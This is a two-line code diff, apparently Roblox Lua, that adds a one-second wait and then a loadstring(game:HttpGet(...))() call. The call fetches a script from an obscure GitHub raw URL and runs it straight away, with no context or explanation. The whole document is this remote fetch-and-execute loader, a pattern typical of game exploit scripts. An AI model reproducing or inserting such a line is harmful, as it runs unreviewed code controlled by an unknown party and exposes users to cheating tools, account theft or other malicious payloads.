@@ -1,0 +1,2 @@
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/656546546546546/5/refs/heads/main/kr1minjality"))()
